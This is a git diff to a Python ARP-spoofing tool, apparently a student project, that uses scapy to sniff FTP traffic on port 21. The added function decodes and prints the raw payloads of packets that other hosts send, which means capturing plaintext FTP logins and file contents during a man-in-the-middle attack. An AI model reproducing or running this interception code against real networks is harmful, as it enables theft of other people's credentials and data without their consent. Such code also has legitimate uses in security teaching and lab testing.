@@ -73,11 +73,21 @@ class Spoofer(threading.Thread):
         pcap_listener.setfilter("port 21")
         while not self.event.is_set():
             next_packet = pcap_listener.next()
-            scapy.IP(next_packet[1]).show()
-            scapy.Ether(next_packet[1]).show()
+#            scapy.IP(next_packet[1]).show()
+#            scapy.Ether(next_packet[1]).show()
+            ft_process_packet(scapy.Ether(next_packet[1]), get_mac_address())
 
         self.spoofer_refresher.join()
 
+
+def ft_process_packet(packet, mac):
+    if scapy.Raw in packet:
+        if packet[scapy.Ether].src != mac:
+            info = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
+            print("Mensaje capturado")
+            print(info)
+        else:
+            print("Mensaje reenviado")
 
 def ft_parser_args():
     parser = argparse.ArgumentParser(description='ARP spoofer, ./inuisitor <IP-src> <MAC-src> <IP-target> <MAC-target>')
